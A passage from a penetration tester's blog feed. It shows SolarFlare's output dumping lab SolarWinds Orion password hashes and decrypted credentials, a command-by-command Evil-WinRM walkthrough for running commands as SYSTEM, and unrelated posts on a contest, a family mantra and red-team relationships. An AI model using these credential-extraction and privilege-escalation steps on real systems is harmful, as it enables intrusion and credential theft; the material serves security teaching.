&lt;p&gt;If you are interested in the code you can see it here: &lt;a href=&#34;https://github.com/mubix/solarflare/blob/b87da0b515d20964490dd922f3ef5bc17ed397f3/SolarFlare/Program.cs#L441&#34;&gt;https://github.com/mubix/solarflare/blob/b87da0b515d20964490dd922f3ef5bc17ed397f3/SolarFlare/Program.cs#L441&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;At the time of this writing there is &lt;a href=&#34;https://github.com/hashcat/hashcat/issues/2620&#34;&gt;a pull request to add the newer version of password hashing&lt;/a&gt; that SolarWinds uses to store credentials used to access SolarWinds.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;The major concern about SolarWinds Orion accounts is that it upper cases all account passwords&lt;/strong&gt;. This means that the key space to attempt to crack them is 26 characters smaller (without the lowercase characters). This means that even though SolarWinds uses PBDKF12, 1000 iterations of it, and SHA512 hashing, cracking the account passwords is exponentially easier and faster.&lt;/p&gt;
&lt;p&gt;Admin and Guest are common across installs. The guest account used to be enabled by default, which would allow attackers to gain access to the interface. This is no longer the case. There are two new accounts &lt;code&gt;_system&lt;/code&gt; which has it&amp;rsquo;s password stored in the credential database, and &lt;code&gt;iprequest&lt;/code&gt; which I believe is a result of the one of the features I installed on the VM. The &lt;code&gt;_system&lt;/code&gt; account is enabled by default and is an administrator. Even though this account has a randomized password, it being stored in the database means I can decrypt it, instead of trying to crack it.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;============================================
| DB - Exporting Accounts Table            |
|        Account: _system
|        Password Hash: qE9ClH&amp;lt;snip&amp;gt;
|        Password Salt: XgtO8XNWc/KiIdglGOnxvw==
|        Hashcat Mode 12501: $solarwinds$1$XgtO8XNWc/KiIdglGOnxvw==$qE9ClHDI&amp;lt;snip&amp;gt;
|        Account Enabled: Y
|        Allow Admin: Y
|        Last Login: 12/15/2020
--------------------------------------------
|        Account: Admin
|        Password Hash: IfAEwA7LXxOAH7ORCG0ZYeq&amp;lt;snip&amp;gt;
|        Password Salt: jNhn3i2XtHfY8y4EOmNdiQ==
|        Hashcat Mode 12501: $solarwinds$1$jNhn3i2XtHfY8y4EOmNdiQ==$IfAEwA7LXxOAH7ORCG0ZY&amp;lt;snip&amp;gt;
|        Account Enabled: Y
|        Allow Admin: Y
|        Last Login: 12/02/2020
--------------------------------------------
|        Account: Guest
|        Password Hash: Y/EMuOWMNfCd&amp;lt;snip&amp;gt;
|        Salt is NULL in DB so lowercase username is used: guest
|        Hashcat Mode 12500: $solarwinds$0$guest$Y/EMuOWMNfCd&amp;lt;snip&amp;gt;
|        Account Enabled: N
|        Allow Admin: N
|        Last Login: 12/30/1899
--------------------------------------------
|        Account: iprequest
|        Password Hash: 7zskGWFukuHuwQ&amp;lt;snip&amp;gt;
|        Salt is NULL in DB so lowercase username is used: iprequest
|        Hashcat Mode 12500: $solarwinds$0$iprequest$7zskGWFukuHuwQ&amp;lt;snip&amp;gt;
|        Account Enabled: Y
|        Allow Admin: N
|        Last Login: 01/01/1900
--------------------------------------------
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Here is what an older account type looks like:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;|        Account: SITTINGDUCK\uberolduser
|        Password: 11-417578424799297-9-6260697430795685763067724
|        Decoded Password: ASDQWE123
|        Hashcat Mode 21500: $solarwinds$0$admin$fF1lrlOXfxVz51Etjcs18XNK+Zt3keV2AllH9cYtGzdt5Yg2TtcsU84G9+5VVFMIUorR5eNJzX/1kmef6wZfrg==
|        Account Enabled: Y
|        Allow Admin: N
|        Last Login: 11/15/2015
|        Account SID: S-1-5-21-1000000000-2000000000-3000000000-50000
|        Group: SITTINGDUCK\Domain Admins
--------------------------------------------
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;exporting-the-credentials-table&#34;&gt;Exporting the Credentials Table&lt;/h3&gt;
&lt;p&gt;Finally the actual credential table. I&amp;rsquo;ve observed 4 different methods for storing credentials here:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Clear text (as is the case for SNMP community strings)&lt;/li&gt;
&lt;li&gt;Encrypted with the RSA key (this is the older method, being phased out it appears)&lt;/li&gt;
&lt;li&gt;Encrypted with AES using the &lt;code&gt;default.dat&lt;/code&gt; file as the decryption key&lt;/li&gt;
&lt;li&gt;Encrypted using &lt;a href=&#34;https://www.nuget.org/packages/System.Security.Cryptography.Xml/&#34;&gt;Microsoft&amp;rsquo;s XML encryption/decryption method&lt;/a&gt;.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;SolarFlare recognizes all of them, and will attempt to decrypt them accordingly. This is where you will find AWS API keys, vCenter credentials, SNMPv3 credentials, Cisco router and switch passwords and enable passwords. This is where the scary bits are.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;============================================
| DB - Exporting Credentials Table         |
------------------1--------------------------
| Type: SolarWinds.Orion.Core.SharedCredentials.Credentials.UsernamePasswordCredential
| Name: _system
|       Desc: Cortex Integration
|       Owner: CORE
|               Password: 9dM-5pH/&amp;amp;amp;Y(KU-v
|               Username: _system
------------------1--------------------------
------------------2--------------------------
| Type: SolarWinds.Orion.Core.SharedCredentials.Credentials.UsernamePasswordCredential
| Name: JobEngine
|       Desc: Job Engine router TCP endpoint credentials
|       Owner: JobEngine
|               Password: +fBByxJFsK+da6ZN2wKvLTKC/PWUzFlfIvvwtW/XqvA=
|               Username: KWPPhiYJmE8+fRF6qlkxulK2tf3t79TQOAk1ywBMVOI=
------------------2--------------------------
------------------3--------------------------
| Type: SolarWinds.Orion.Core.Models.Credentials.SnmpCredentialsV2
| Name: public
|       Desc:
|       Owner: Orion
|               Community: public
------------------3--------------------------
------------------4--------------------------
| Type: SolarWinds.Orion.Core.Models.Credentials.SnmpCredentialsV2
| Name: private
|       Desc:
|       Owner: Orion
|               Community: private
------------------4--------------------------
------------------5--------------------------
| Type: SolarWinds.Orion.Core.SharedCredentials.Credentials.UsernamePasswordCredential
| Name: Erlang cookie
|       Desc: Erlang clustering cookie
|       Owner: Erlang
|               Password: abcdefg12456789abcde
|               Username: ignored
------------------5--------------------------
------------------6--------------------------
| Type: SolarWinds.Orion.Core.SharedCredentials.Credentials.UsernamePasswordCredential
| Name: RabbitMQ user account
|       Desc: RabbitMQ user account for Message Bus
|       Owner: RabbitMQ
|               Password: LtVmCrzlTNyWmwxpxJMi
|               Username: orion
------------------6--------------------------
------------------7--------------------------
| Type: SolarWinds.Orion.Core.Models.Credentials.SnmpCredentialsV3
| Name: User: snmpv3user, Context: thisisthecontext
|       Desc:
|       Owner: Orion
|               AuthenticationKeyIsPassword: false
|               AuthenticationPassword: ASDqwe123
|               AuthenticationType: SHA1
|               Context: thisisthecontext
|               PrivacyKeyIsPassword: false
|               PrivacyPassword: ASDqwe123
|               PrivacyType: AES256
|               UserName: snmpv3user
------------------7--------------------------
------------------8--------------------------
| Type: SolarWinds.Orion.Core.Models.Credentials.SnmpCredentialsV3
| Name: User: rootsnmpv3, Context: newcontextv3
|       Desc:
|       Owner: Orion
|               AuthenticationKeyIsPassword: true
|               AuthenticationPassword: ASDqwe123
|               AuthenticationType: MD5
|               Context: newcontextv3
|               PrivacyKeyIsPassword: true
|               PrivacyPassword: ASDqwe123
|               PrivacyType: AES128
|               UserName: rootsnmpv3
------------------8--------------------------
------------------9--------------------------
| Type: SolarWinds.Orion.Core.SharedCredentials.Credentials.UsernamePasswordCredential
| Name: DomainAdmin
|       Desc:
|       Owner: Orion
|               Password: ASDqwe123
|               Username: SITTINGDUCK\uberuser
------------------9--------------------------
------------------10--------------------------
| Type: SolarWinds.Orion.Core.SharedCredentials.Credentials.UsernamePasswordCredential
| Name: DomainJoiner
|       Desc:
|       Owner: Orion
|               Password: ASDqwe123
|               Username: superadmin@sittingduck.info
------------------10--------------------------
------------------11--------------------------
| Type: SolarWinds.Orion.Core.SharedCredentials.Credentials.UsernamePasswordCredential
| Name: vesxi
|       Desc: vesxi
|       Owner: VIM
|               Password: ASDqwe123
|               Username: root
------------------11--------------------------
------------------12--------------------------
| Type: SolarWinds.Orion.Core.SharedCredentials.Credentials.ActiveDirectoryCredential
| Name: SITTINGDUCK\uberuser
| 	Desc:
| 	Owner: Orion
| 		Password: ASDqwe213
| 		Username: SITTINGDUCK\uberuser
------------------12--------------------------
------------------13--------------------------
| Type: SolarWinds.APM.Common.Credentials.ApmUsernamePasswordCredential
| Name: App Monitoring User
| 	Desc:
| 	Owner: APM
| 		Password: ASDqwe123
| 		Username: SITTINGDUCK\uberuser
------------------13--------------------------
------------------14--------------------------
| Type: SolarWinds.SRM.Common.Credentials.SmisCredentials
| Name: EMC_SMIS_Solarwinds
| 	Desc:
| 	Owner: SRM
| 		HttpPort: 5988
| 		HttpsPort: 5989
| 		InteropNamespace: /interop
| 		Namespace: root/emc
| 		Password: ASDqwe123
| 		Username: solarwinds
| 		UseSSL: true
------------------14--------------------------
------------------15--------------------------
| Type: SolarWinds.ESI.Common.Connection.ExternalSystemCredential
| Name: ESC
| 	Desc:
| 	Owner: ESI
| 		Password: ASDqwe123
| 		Username: solar_winds
------------------15--------------------------
------------------16--------------------------
| Type: SolarWinds.Orion.Web.Integration.OAuth2Token
| Name: SITTINGDUCK\uberuser
| 	Desc:
| 	Owner: Web.Integration
| 		AccessToken: GthQHd3&amp;lt;snip&amp;gt;
| 		AccessTokenExpiration: 2020-11-01T10:52:50.2768075Z
| 		AccessTokenIssueDate: 2020-11-01T09:52:51.2768075Z
| 		RefreshToken:hEyph9WqIfzm&amp;lt;snip&amp;gt;
| 		Scopes:
| 		Username: uberuser@sittingduck.info
------------------16--------------------------
------------------17--------------------------
| Type: SolarWinds.SRM.Common.Credentials.XtremIoHttpCredential
| Name: XtremIO_Admin
| 	Desc:
| 	Owner: SRM
| 		HttpPort: 80
| 		HttpsPort: 443
| 		Password: ASDqwe123
| 		Username: admin
| 		UseSsl: true
------------------18--------------------------
============================================
============================================
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;If you&amp;rsquo;ve made it this far, you can find the project over at &lt;a href=&#34;https://github.com/mubix/solarflare&#34;&gt;https://github.com/mubix/solarflare&lt;/a&gt;.
Also, for defenders, I have added the creation of the file &amp;ldquo;SolarFlare&amp;rdquo; in &lt;code&gt;C:\Windows\Temp\&lt;/code&gt; when you run SolarFlare. Hopefully that will help catch any pentesters or script kiddies that don&amp;rsquo;t read code or compile for themselves.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>2020 OSCP Contest</title>
      <link>https://malicious.link/post/2020/2020-oscp-contest/</link>
      <pubDate>Thu, 26 Nov 2020 09:30:44 -0500</pubDate>
      
      <guid>https://malicious.link/post/2020/2020-oscp-contest/</guid>
      <description>&lt;p&gt;Last year I decided to give away 3 vouchers to PWK 60 days of labs. This was
of my own free will and under no umbrella. I wanted to give back to the community
and industry that provided a means to which I can feed, clothe, and put a roof
over my family&amp;rsquo;s head.&lt;/p&gt;
&lt;p&gt;But, how to give away something like this? I didn&amp;rsquo;t want it to go to people
who just were faster at coding than someone else, or could figure out some
obscure CTF challenge. I wanted it to go to someone that was hungry to learn and
hungry to achieve more, so I devised a 3 stage challenge.&lt;/p&gt;
&lt;p&gt;Here is the original post about it: &lt;a href=&#34;https://gist.github.com/mubix/f14e3681df6aedd08394b71cfec6e49e&#34;&gt;https://gist.github.com/mubix/f14e3681df6aedd08394b71cfec6e49e&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;challenge-1&#34;&gt;Challenge 1:&lt;/h2&gt;
&lt;p&gt;Get two people to send us a letter of recommendation. This didn&amp;rsquo;t have to be
formal and could very easily just be a direct message from them. We used this
challenge to get a sense for your effect on others. Someone who does good for
others has no trouble finding people who will speak well of them. This was also
a test to see if you had the perseverance to ensure both people contacted us.&lt;/p&gt;
&lt;h2 id=&#34;challenge-2&#34;&gt;Challenge 2:&lt;/h2&gt;
&lt;p&gt;Send us information about a topic in Infosec you are passionate about and write
a little bit about it. This could just be the word &amp;ldquo;Forensics&amp;rdquo;, but the caveat
is that you needed to convince us of why you are interested in that topic and
show passion for it. No limit or requirement of length, but one word answers
will probably not make it to the next round.&lt;/p&gt;
&lt;h2 id=&#34;challenge-3&#34;&gt;Challenge 3:&lt;/h2&gt;
&lt;p&gt;The final challenge would be based on your answer to challenge 2. We asked
participants to write up a topic pertaining to their passion or selected interest.
This will need to be at least a couple paragraphs.&lt;/p&gt;
&lt;p&gt;Thats it. If you made it through to the final challenge by showing enough effort,
We put in the effort to read every entry and selected the &amp;lsquo;best&amp;rsquo; top 3 based on the participants:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Respect (of time, mine, theirs, and others)&lt;/li&gt;
&lt;li&gt;Perseverance&lt;/li&gt;
&lt;li&gt;Humility (not self-deprecation)&lt;/li&gt;
&lt;li&gt;Resourcefulness (specifically in challenge 3, to learn something new)&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;This year. We are doing it again. This time, I have more help. Along with &lt;a href=&#34;https://twitter.com/spikygeek&#34;&gt;SpikyGeek&lt;/a&gt;, the amazing &lt;a href=&#34;https://twitter.com/int0x80&#34;&gt;Int0x80&lt;/a&gt;
from &lt;a href=&#34;https://twitter.com/dualcoremusic&#34;&gt;@dualcoremusic&lt;/a&gt; will be joining me on
helping to judge the contest, and this year, there are &lt;strong&gt;FIVE (5)&lt;/strong&gt; vouchers
graciously donated from the &lt;a href=&#34;https://offensive-security.com&#34;&gt;Offensive Security&lt;/a&gt; team.
So there will be a TOP 5.&lt;/p&gt;
&lt;h1 id=&#34;rules&#34;&gt;Rules&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;ALL submissions must be done via &lt;strong&gt;direct message&lt;/strong&gt; to the &lt;a href=&#34;https://twitter.com/oscpgiveaway&#34;&gt;OSCPGiveaway&lt;/a&gt; twitter account. This means that if you want
to submit a PDF or doc or whatever, you need to post a link to a Google Drive file or some other means. Emails regarding the contest to any of the contest committee will be ignored.&lt;/li&gt;
&lt;li&gt;All announcements will go through the twitter account as well, so you should turn on notifications for that account if you want to keep up to date with things.&lt;/li&gt;
&lt;li&gt;If you have more than 2 letters of recommendation sent to us, we will assume you don&amp;rsquo;t respect my time and disqualify you due to the tenets of the contest. We do not have all the time in the world and there are only three of us looking through every person&amp;rsquo;s submissions in this contest. We don&amp;rsquo;t have infinite time to do so.&lt;/li&gt;
&lt;li&gt;If you cannot seem to follow the directions as they are laid out in the above document, you will be disqualified. Read carefully.&lt;/li&gt;
&lt;li&gt;In your first DM to the twitter account include your favorite emojii by itself just to show that you actually read these rules. This will be how you enter the contest.&lt;/li&gt;
&lt;li&gt;Random mentions sent to us or the team on Twitter are not Direct Messages, people vouching for you, or endorsements this way will be ignored and not count towards your contest submissions.&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;addendums-and-clarifications&#34;&gt;Addendums and Clarifications&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;Challenge 3 is supposed to be a question/topic that we (the organizers) chose based on the topic you submitted for Challenge 2. Apologies for the confusion here. It will be worded better next year.&lt;/li&gt;
&lt;li&gt;You do not have to wait for any acknowledgment to submit Challenge 1 and Challenge 2.&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;deadlines&#34;&gt;Deadlines&lt;/h1&gt;
&lt;h2 id=&#34;challenge-1-december-5th&#34;&gt;Challenge 1: December 5th&lt;/h2&gt;
&lt;h2 id=&#34;challenge-2-december-10th&#34;&gt;Challenge 2: December 10th&lt;/h2&gt;
&lt;h2 id=&#34;challenge-3-december-26th&#34;&gt;Challenge 3: December 26th&lt;/h2&gt;
&lt;h2 id=&#34;winners-announced-on-january-2nd-2021&#34;&gt;Winners Announced on January 2nd 2021&lt;/h2&gt;
</description>
    </item>
    
    <item>
      <title>Family Mission Statement</title>
      <link>https://malicious.link/post/2020/family-mission-statement/</link>
      <pubDate>Wed, 30 Sep 2020 09:30:44 -0500</pubDate>
      
      <guid>https://malicious.link/post/2020/family-mission-statement/</guid>
      <description>&lt;p&gt;I love this so much I wanted to keep it around. I googled to see if this was posted somewhere in text form but I couldn&amp;rsquo;t find it. Traditionally I haven&amp;rsquo;t been a fan of daily mantras, but I&amp;rsquo;m thinking about talking to my kids about repeating this one.&lt;/p&gt;
&lt;p&gt;From &lt;a href=&#34;https://www.tiktok.com/@emmalinecs&#34;&gt;@emmalinecs&lt;/a&gt; on Tiktok: &lt;a href=&#34;https://www.tiktok.com/@emmalinecs/video/6866994894930562310&#34;&gt;https://www.tiktok.com/@emmalinecs/video/6866994894930562310&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;For those who don&amp;rsquo;t want to click on a Tiktok link or use the service I&amp;rsquo;ll set the scene a bit. This mom, Emma, repeats the following with her kids on the video. I&amp;rsquo;m not sure if this is a daily thing or not, but I will imagine it as so. Much of change is incremental generational movements. You don&amp;rsquo;t move a mountain using one big heave, you do so by relentlessly changing it bit by bit. Persistence is power.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;If you look or sound different, trans or gay,&lt;/p&gt;
&lt;p&gt;I love and respect you every single day.&lt;/p&gt;
&lt;p&gt;I speak up for what&amp;rsquo;s right and help those when they need.&lt;/p&gt;
&lt;p&gt;I follow my instincts, they&amp;rsquo;re the path that I lead.&lt;/p&gt;
&lt;p&gt;I nurture my soul, my body, my mind.&lt;/p&gt;
&lt;p&gt;I don&amp;rsquo;t need to be perfect, to myself I&amp;rsquo;ll be kind.&lt;/p&gt;
&lt;p&gt;If I need help, I will ask, that&amp;rsquo;s the brave thing to do.&lt;/p&gt;
&lt;p&gt;And if I do something wrong, I&amp;rsquo;ll say sorry to you.&lt;/p&gt;
&lt;p&gt;I&amp;rsquo;ll forever work hard, explore, learn and play.&lt;/p&gt;
&lt;p&gt;I don&amp;rsquo;t need to have it all sorted, but I&amp;rsquo;ll do these each day:&lt;/p&gt;
&lt;p&gt;Loving thoughts, loving words, loving heart on this day,&lt;/p&gt;
&lt;p&gt;I am safe, I am loved, life is great&amp;hellip; Hip hip! Oh yay!&lt;/p&gt;
&lt;/blockquote&gt;
</description>
    </item>
    
    <item>
      <title>Run as SYSTEM using Evil-WinRM</title>
      <link>https://malicious.link/post/2020/run-as-system-using-evil-winrm/</link>
      <pubDate>Sun, 13 Sep 2020 09:30:44 -0500</pubDate>
      
      <guid>https://malicious.link/post/2020/run-as-system-using-evil-winrm/</guid>
      <description>&lt;p&gt;This is a quick blog post on how to elevate to SYSTEM without the need for PSEXEC when you are using PowerShell, or more specifcially in this case, PowerShell Remoting (WinRM).&lt;/p&gt;
&lt;p&gt;First off, let me introduce my tool of choice here. It&amp;rsquo;s &lt;a href=&#34;https://github.com/Hackplayers/evil-winrm&#34;&gt;Evil-WinRM&lt;/a&gt;. I spoke about it in the Practical Exploitation video here: &lt;a href=&#34;https://www.youtube.com/watch?v=tVgJ-9FJKxE&#34;&gt;https://www.youtube.com/watch?v=tVgJ-9FJKxE&lt;/a&gt;, so I won&amp;rsquo;t go too far indepth. It&amp;rsquo;s essentially the only WinRM tool that I&amp;rsquo;ve found to work well in a non-Windows native situation (also you can proxy it through proxychains which is AWESOME!!).&lt;/p&gt;
&lt;p&gt;Anyways.&lt;/p&gt;
&lt;p&gt;I want to document how to run commands as &lt;strong&gt;SYSTEM&lt;/strong&gt; without the use of PSEXEC. I found this technique on a &lt;a href=&#34;https://4sysops.com&#34;&gt;4sysops blog&lt;/a&gt; post called &lt;a href=&#34;https://4sysops.com/archives/running-powershell-remotely-as-system-with-invoke-commandas/&#34;&gt;Running PowerShell Remotely As System with Invoke-CommandAs&lt;/a&gt;. &lt;em&gt;Side-note&lt;/em&gt; you should definitely bookmark thier blog it&amp;rsquo;s great.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Invoke-CommandAs&lt;/strong&gt; is not a native function of PowerShell, so you need to download it from the original author&amp;rsquo;s Github repo: &lt;a href=&#34;https://github.com/mkellerman/Invoke-CommandAs&#34;&gt;https://github.com/mkellerman/Invoke-CommandAs&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;For our uses all you need to do is get these two particular files:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/mkellerman/Invoke-CommandAs/blob/master/Invoke-CommandAs/Public/Invoke-CommandAs.ps1&#34;&gt;https://github.com/mkellerman/Invoke-CommandAs/blob/master/Invoke-CommandAs/Public/Invoke-CommandAs.ps1&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/mkellerman/Invoke-CommandAs/blob/master/Invoke-CommandAs/Private/Invoke-ScheduledTask.ps1&#34;&gt;https://github.com/mkellerman/Invoke-CommandAs/blob/master/Invoke-CommandAs/Private/Invoke-ScheduledTask.ps1&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Here you can see me putting those two files into a &lt;code&gt;scripts&lt;/code&gt; directory I made inside of the Evil-WinRM folder. (&lt;code&gt;git clone https://github.com/Hackplayers/evil-winrm&lt;/code&gt; + &lt;code&gt;bundle install&lt;/code&gt;)&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;root@attacker:~/evil-winrm/scripts# ls
Invoke-CommandAs.ps1
root@attacker:~/evil-winrm/scripts# wget https://raw.githubusercontent.com/mkellerman/Invoke-CommandAs/master/Invoke-CommandAs/Private/Invoke-
--2020-09-13 20:17:56--  https://raw.githubusercontent.com/mkellerman/Invoke-CommandAs/master/Invoke-CommandAs/Private/Invoke-ScheduledTask.ps
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 151.101.200.133
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|151.101.200.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10009 (9.8K) [text/plain]
Saving to: &amp;#39;Invoke-ScheduledTask.ps1&amp;#39;

Invoke-ScheduledTask.ps1                      100%[===========================================================================================

2020-09-13 20:17:56 (5.37 MB/s) - &amp;#39;Invoke-ScheduledTask.ps1&amp;#39; saved [10009/10009]
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Once that&amp;rsquo;s ready, I run Evil-WinRM with the &lt;code&gt;-s&lt;/code&gt; flag and specify the &lt;code&gt;scripts&lt;/code&gt; directory I put the two files in.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;root@attacker:~/evil-winrm# ruby evil-winrm.rb -i 192.168.80.10 -u uberuser -s scripts/
Enter Password:

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\uberuser\Documents&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Once I have the shell I load each of the scripts by typing out their file names (tab complete should work)&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;*Evil-WinRM* PS C:\Users\uberuser\Documents&amp;gt; Invoke-ScheduledTask.ps1
*Evil-WinRM* PS C:\Users\uberuser\Documents&amp;gt; Invoke-CommandAs.ps1
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Once they are loaded you need to run the &lt;code&gt;menu&lt;/code&gt; command to load the functions into memory on the attackers side. I haven&amp;rsquo;t looked at the code enough to know exactly why this is needed, but it doesn&amp;rsquo;t seem to work if you don&amp;rsquo;t.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;*Evil-WinRM* PS C:\Users\uberuser\Documents&amp;gt; menu

   ,.   (   .      )               &amp;#34;            ,.   (   .      )       .
  (&amp;#34;  (  )  )&amp;#39;     ,&amp;#39;             (`     &amp;#39;`    (&amp;#34;     )  )&amp;#39;     ,&amp;#39;   .  ,)
.; )  &amp;#39; (( (&amp;#34; )    ;(,      .     ;)  &amp;#34;  )&amp;#34;  .; )  &amp;#39; (( (&amp;#34; )   );(,   )((
_&amp;#34;.,_,.__).,) (.._( ._),     )  , (._..( &amp;#39;.._&amp;#34;._, . &amp;#39;._)_(..,_(_&amp;#34;.) _( _&amp;#39;)
\_   _____/__  _|__|  |    ((  (  /  \    /  \__| ____\______   \  /     \
 |    __)_\  \/ /  |  |    ;_)_&amp;#39;) \   \/\/   /  |/    \|       _/ /  \ /  \
 |        \\   /|  |  |__ /_____/  \        /|  |   |  \    |   \/    Y    \
/_______  / \_/ |__|____/           \__/\  / |__|___|  /____|_  /\____|__  /
        \/                               \/          \/       \/         \/
              By: CyberVaca, OscarAkaElvis, Laox @Hackplayers

[+] Bypass-4MSI
[+] Dll-Loader
[+] Donut-Loader
[+] Invoke-Binary
[+] Invoke-CommandAs
[+] Invoke-ScheduledTask
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;As we can see both of the needed functions are loaded and we can finally issue our commands as SYSTEM with the &lt;code&gt;-AsSystem&lt;/code&gt; flag and the command being &lt;code&gt;whoami&lt;/code&gt;:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;*Evil-WinRM* PS C:\Users\uberuser\Documents&amp;gt; Invoke-CommandAs -ScriptBlock {whoami} -AsSystem
nt authority\system
*Evil-WinRM* PS C:\Users\uberuser\Documents&amp;gt;
&lt;/code&gt;&lt;/pre&gt;</description>
    </item>
    
    <item>
      <title>The Four Phases of Offensive Security Teams</title>
      <link>https://malicious.link/post/2020/four-phases-of-offsec/</link>
      <pubDate>Sun, 05 Jul 2020 09:30:44 -0500</pubDate>
      
      <guid>https://malicious.link/post/2020/four-phases-of-offsec/</guid>
      <description>&lt;p&gt;For brevity, I will be using the term &amp;ldquo;partner&amp;rdquo; to refer to the customer, Defensive Team, IT Team, or other direct consumers of the Offensive Team&amp;rsquo;s output.&lt;/p&gt;
&lt;p&gt;In my experience, offensive security teams, be them internal or external (consultants/contractors), the relationship they have with companies falls into one of four phases:
The &amp;ldquo;Adversarial&amp;rdquo; phase
The &amp;ldquo;Hammer&amp;rdquo; phase
The &amp;ldquo;Friendship&amp;rdquo; phase
The &amp;ldquo;Adversarial Friendship&amp;rdquo; phase&lt;/p&gt;
&lt;h2 id=&#34;adversarial&#34;&gt;Adversarial&lt;/h2&gt;
&lt;p&gt;The first phase is that of adversaries. Neither party wants to be doing what they are doing. The partner doesn&amp;rsquo;t see value in the Offensive Team and only sees it as a waste of time, extra work, a checkbox to become compliant, or orders from &amp;ldquo;on high.&amp;rdquo; Either way, neither team wants to be doing what they are doing.&lt;/p&gt;
&lt;p&gt;How do you make the most of this phase or move out of it? The Offensive Team has to do the heavy lifting here. The partner is in this state, either from a negative experience, or lack of experience, so it is on the Offensive Team to over-communicate goals and objectives and be flexible to adjust to benefit the direct partner as much as possible. The Offensive Team should suggest modifying the engagement to limit extra work from the partner, even if it limits the scope of the engagement. Being over accommodating can help create a positive experience for the partner and move future engagements with this partner out of this phase, even if it doesn&amp;rsquo;t directly affect the one at hand.&lt;/p&gt;
&lt;h2 id=&#34;hammer&#34;&gt;Hammer&lt;/h2&gt;
&lt;p&gt;The &amp;ldquo;Hammer&amp;rdquo; phase is where the intent of engagement is for the Offensive Team&amp;rsquo;s output to be used as a hammer. This phase is also the most common in my experience as it is mainly used for internal politics, to prove points or cause actions. For example, if a development team refuses to patch a particular vulnerability due to projected outages, a partner might pull in an Offensive Team to demonstrate the risk of not patching it. Offensive Teams do not always know they are being used as a hammer. The unfortunate result of this phase is that many times the Offensive Team has unintentionally created a negative experience for the team being attacked and used as an example. Using the Offensive Team in this way can create problems in future engagements and make sure they land squarely in the Adversarial phase.&lt;/p&gt;
&lt;p&gt;There are positives to this phase. The hammer phase can help to overcome prejudices and biases and open eyes to possibilities. However, it is a fine line between &amp;ldquo;name and shame&amp;rdquo; and eye-opening, a line that the Offensive Team has very little control over. Internal Offensive Teams need to take extra care to not &amp;ldquo;name and shame&amp;rdquo; any part of the company as it will spread like wildfire that that is the intent of the team and is very hard to recover from.&lt;/p&gt;
&lt;p&gt;How do you know your Offensive Team team is being used as a hammer? Over-communication again. Setting expectations correctly about what the output should be and the goals of the engagement are. It should become evident that the more you talk to the partner about goals, whether you are being used in proving a point or if you are in one of the other phases.&lt;/p&gt;
&lt;h2 id=&#34;friendship&#34;&gt;Friendship&lt;/h2&gt;
&lt;p&gt;The friendship phase is when the partner and the Offensive Team have become friends (at least in a professional manner) and know each other&amp;rsquo;s teams&amp;rsquo; goals. They have realized that they&amp;rsquo;re both needed in the organization, and genuinely want to help either other achieve their goals.&lt;/p&gt;
&lt;p&gt;The good part of this phase is that you get more done as an Offensive Team. There is less friction to performing engagements and providing your results.&lt;/p&gt;
&lt;p&gt;The bad part is that it&amp;rsquo;s unfortunately easy to slip back into one of the previous phases via employee turn over or one poorly worded report. Friendships require cultivation, and staying in this phase needs regular conversations with the teams and partners involved.&lt;/p&gt;
&lt;h2 id=&#34;adversarial-friendship&#34;&gt;Adversarial Friendship&lt;/h2&gt;
&lt;p&gt;The final phase is the adversarial friendship. This phase is when software vulnerabilities no longer hold political weight at the company, and the security goal has shifted to prevention, response, and detection. The partner and the Offensive Teams work hand in hand, many times as a &amp;ldquo;Purple Team&amp;rdquo; or Red vs. Blue, to achieve efficiency goals, such as quicker time-to-detection or time-to-eradication.&lt;/p&gt;
&lt;p&gt;This phase is the optimal situation and rarely achieved. Many companies I have worked for/with have attempted to jump to this phase without the friendship portion required to make it work. However, when it does, both the partner and the Offensive Team are pushed to improve and excel beyond their previous capabilities, and pure magic can happen.&lt;/p&gt;
&lt;p&gt;I have only been in the Adversarial Friendship Phase three times in my career, and I can say that it was unfortunately short-lived. It takes the two teams actually having pure fun together to make it work.&lt;/p&gt;
&lt;h2 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h2&gt;
